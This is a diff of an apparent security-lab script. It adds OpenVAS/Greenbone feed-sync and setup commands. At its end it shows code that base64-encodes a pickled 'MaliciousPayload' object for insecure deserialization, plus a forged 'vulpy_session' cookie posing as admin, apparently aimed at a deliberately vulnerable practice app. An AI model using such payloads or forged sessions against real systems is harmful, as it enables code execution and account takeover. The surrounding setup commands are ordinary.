@@ -248,11 +248,44 @@ echo "[*] Fixing permissions to avoid ospd-openvas service errors..."
 # Fix permissions for OpenVAS log file
 sudo chmod 666 /var/log/gvm/openvas.log
 
+# cd ~/Downloads
+source venv/bin/activate
+python3 -m pip install greenbone-feed-sync
+
 # Fix ownership for GVM user directories
 sudo chown -R _gvm:_gvm /etc/openvas/gnupg
 sudo chown -R _gvm:_gvm /var/log/gvm
 sudo chown -R _gvm:_gvm /var/lib/gvm
+# sudo greenbone-feed-sync
 sudo -u _gvm greenbone-feed-sync --type GVMD_DATA
+sudo -u _gvm greenbone-feed-sync --type gvmd-data
+sudo -u _gvm greenbone-feed-sync --type nvt
+sudo -u _gvm greenbone-feed-sync --type scap
+sudo -u _gvm greenbone-feed-sync --type cert
+sudo -u _gvm greenbone-feed-sync --type notus
+sudo -u _gvm gvmd --rebuild-gvmd-data=all
+sudo gvm-stop
+var/lib/gvm/
+sudo /usr/local/bin/greenbone-feed-sync
+# Synchronize NVT (Network Vulnerability Tests)
+rsync -avz rsync://feed.community.greenbone.net:/nvt-feed /var/lib/gvm/data-objects/nvt-feed
+# Synchronize SCAP data
+rsync -avz rsync://feed.community.greenbone.net:/scap-data /var/lib/gvm/data-objects/scap-data
+# Synchronize CERT data
+rsync -avz rsync://feed.community.greenbone.net:/cert-data /var/lib/gvm/data-objects/cert-data
+# Synchronize GVMD data (users, scan configs, port lists)
+rsync -avz rsync://feed.community.greenbone.net:/gvmd-data /var/lib/gvm/data-objects/gvmd
+# Synchronize NOTUS data
+rsync -avz rsync://feed.community.greenbone.net:/notus /var/lib/gvm/data-objects/notus
+
+
+
+sudo cp -r ~/openvas_feeds/nvt-feed/* /var/lib/gvm/feed/nvt/
+sudo cp -r ~/openvas_feeds/scap-data/* /var/lib/gvm/feed/scap/
+sudo cp -r ~/openvas_feeds/cert-data/* /var/lib/gvm/feed/cert/
+sudo cp -r ~/openvas_feeds/gvmd-data/* /var/lib/gvm/feed/gvmd/
+sudo cp -r ~/openvas_feeds/notus/* /var/lib/gvm/feed/notus/
+
 
 # Optional: Fix Redis config if needed (uncomment to apply)
 # sudo sed -i 's/^save ""/# save ""/' /etc/redis/redis-openvas.conf
@@ -297,3 +330,10 @@ obj = MaliciousPayload()
 new_data = pickle.dumps(obj)
 new_encoded = base64.b64encode(new_data).decode()
 print(new_encoded)
+
+
+
+##
+# vulpy_session=eyJ1c2VybmFtZSI6ICJhZG1pbiJ9
+# base64 decoded: {"username": "admin"}
+
